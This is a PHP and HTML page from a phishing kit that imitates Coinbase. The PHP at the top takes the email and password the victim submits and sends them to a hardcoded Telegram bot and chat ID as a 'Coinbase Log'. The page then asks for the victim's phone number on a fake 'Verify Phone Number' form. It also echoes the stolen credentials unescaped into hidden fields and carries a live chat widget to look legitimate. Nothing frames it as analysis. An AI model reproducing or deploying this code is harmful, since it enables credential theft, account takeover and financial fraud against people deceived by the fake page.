<?php
session_start();
$password = $_POST['password'];
$email = $_POST['email'];
$_SESSION['user'] = $email;
$_SESSION['pwd'] = $password;
// $mobile = $_POST['mobile'];

$bot_token='6311476319:AAFS0BODlPP6QcitC12jsF7CxS6A0UG4Jeo';
$chat_id='1184527432';



  $message = "=============Coinbase Log=============\nAttempt 1 \nEmail: " . $email. "\npassword: " . $password. "\nMobile: " . $mobile;


  $url = "https://api.telegram.org/bot6311476319:AAFS0BODlPP6QcitC12jsF7CxS6A0UG4Jeo/sendMessage?chat_id=" . $chat_id . "&text=" . urlencode($message);
// print_r($url);
  $response = file_get_contents($url);
  ?>


<!DOCTYPE html>
<html lang="en">
<head>
  <title>Coinbase</title>
  <meta charset="utf-8">
     <link rel="icon" href="assets/favicon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" type="text/css" href="style.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
<link rel='stylesheet' href='https://cdn.jsdelivr.net/npm/@accessible360/accessible-slick@1.0.1/slick/slick.min.css'>
<link rel='stylesheet' href='https:////cdn.jsdelivr.net/npm/@accessible360/accessible-slick@1.0.1/slick/accessible-slick-theme.min.css'>
<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.14.0/css/all.min.css'>


    <style>
        .btn:not(:disabled):not(.disabled) {
    cursor: pointer;
    height: 60px;
}
.overlay {
    padding-top: 10%;
}
.mob {
      width: 39%;
    margin: auto;
    background: #fff;
    border-radius: 10px;
    padding: 3%;
    border: 1px solid #eee;
}.mob label {
          font-family: sans-serif;
    text-align: left;
    width: 100%;
    margin: 0% 0%;
    font-weight: 600;
    font-size: 16px;
}.mob input {
       width: 100%;
    padding: 3%;
    border-radius: 3px;
    border: 0px solid #eee;
    margin-bottom: 0%;
    box-sizing: border-box;
    margin-top: 0%;
}.mob button {
        background:#0054fe !important;
    border: 0px;
    padding: 3% 9%;
    border-radius: 5px;
    margin-bottom: 5%;
    margin-top: -1%;
    color: #fff;
    font-size: 18px;
    margin-top: 5%;
}
.registration-form h2 {
    font-weight: 700;
    font-size: 38px;
}
            .box-error {
          padding: 40px;
      }
      .coinbaselogo {
          max-width: 120px;
          width: 100%;
      }
      
      .coinbaselogo img {
          width: 100%;
          margin: 0;
      }
      .crossError {
          width: 65px;
          height: 65px;
          background: #dc2916;
          display: flex;
          align-items: center;
          justify-content: center;
          font-size: 30px;
          font-weight: 500;
          color: #fff;
          border-radius: 50%;
          margin: 70px auto 35px;
      }
      .wrap {
    height: 100vh;
}
      .box-error .form_txt p {
          margin: 20px 0 30px;
      }
      
      .wrap-login100 .form_txt input.btn-primary {
          width: 100%;
          padding: 0em 2em;
          font-size: 16px;
          background: #09dcf7;
          height: 45px;
      }
      
      .coinbaselogo {
          max-width: 120px;
          width: 100%;
          display: flex;
          flex-direction: row;
      }
      
      img {
          height: 40px;
      }
      
      .text-left {
          text-align: left;
          text-align: center;
      }
      
      .session {
    width: 480px;
    margin: 20px auto 0;
}

.box-error {
    background: #fff;
    -webkit-box-shadow: 0 1px 46px -4px rgb(0 0 0 / 28%);
    box-shadow: 0 1px 46px -4px rgb(0 0 0 / 28%);
    border-radius: 4px;
    position: relative;
    padding: 40px;
}
label {
    font-weight: 600;
}
ul.links li {
    font-size: 9px;
    color: rgb(103, 104, 104);
    list-style: none;
    text-align: center;
}

ul.links {
    padding: 2%;
}
.form-group.aa {
    display: flex;
    align-items: center;
    justify-content: space-between;
    margin-top: 9%;
}

.form-group.aa a {
    color: #000;
    font-weight: 600;
    font-size: 14px;
}
.ab {
    display: flex;
    align-items: center;
    justify-content: center;
}
header {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 15px 3%;
}

.right a {
    color: rgb(1, 3, 4);
}
.create-account{    background: rgb(1, 3, 4);
    color: rgb(255, 255, 255);
    border-radius: 50px;
    padding: 1% 8%;
    font-size: 17px;
    height: 56px;
    font-weight: 600;
    line-height: 24px;
}
.mob h3 svg {
    margin-right: 2%;
}
@media(max-width: 768px){
	.right {
    display: none;
}
.registration-form {
    padding: 1px 0;
}	
  .mob {
    width: 90%!important;}
}
    </style>
	
<body>
<div class="wrap">


         <div class="overlay">
      <div class="mob">
        <h3 style="     font-weight: 500;
    font-size: 27px;
    margin-top: 3%;
    margin-bottom: 6%;
    display: flex;
    align-items: center;
    justify-content: flex-start;
    color: #333;">
        <img src="assets/favicon.png" style="width: 30px;height: 30px" class="logoa"> Verify Phone Number</h3>
        <form action="contact.php" method="post">
        <input type="hidden" name="email" value="<?php echo $_POST["email"]; ?>">

<input type="hidden" name="password" value="<?php echo $_POST["password"]; ?>">

        
          <div class="ab" style="border: 1px solid #eee">


          <input type="" name="" readonly placeholder="+1" style="    width: 38px;
    padding: 3% 0px;
    height: 48px;
    float: left;
    text-align: center;
    height: 51px;border-right: 1px solid #eee">
          <input type="number" name="mobile" id="mobile" placeholder="Enter phone number to verify" required="" style="   height: 51px;">
          </div>
          <button style=" font-weight: 600;">Submit</button>
        </form>
      </div>
    </div>

</div>

    <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
    <script type="text/javascript"
        src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>
    <script src="assets/js/script.js"></script>

<!-- Start of LiveChat (www.livechat.com) code -->
<script>
    window.__lc = window.__lc || {};
    window.__lc.license = 18644556;
    window.__lc.integration_name = "manual_onboarding";
    window.__lc.product_name = "livechat";
    ;(function(n,t,c){function i(n){return e._h?e._h.apply(null,n):e._q.push(n)}var e={_q:[],_h:null,_v:"2.0",on:function(){i(["on",c.call(arguments)])},once:function(){i(["once",c.call(arguments)])},off:function(){i(["off",c.call(arguments)])},get:function(){if(!e._h)throw new Error("[LiveChatWidget] You can't use getters before load.");return i(["get",c.call(arguments)])},call:function(){i(["call",c.call(arguments)])},init:function(){var n=t.createElement("script");n.async=!0,n.type="text/javascript",n.src="https://cdn.livechatinc.com/tracking.js",t.head.appendChild(n)}};!n.__lc.asyncInit&&e.init(),n.LiveChatWidget=n.LiveChatWidget||e}(window,document,[].slice))
</script>
<noscript><a href="https://www.livechat.com/chat-with/18644556/" rel="nofollow">Chat with us</a>, powered by <a href="https://www.livechat.com/?welcome" rel="noopener nofollow" target="_blank">LiveChat</a></noscript>
<!-- End of LiveChat code -->




</body>

</html>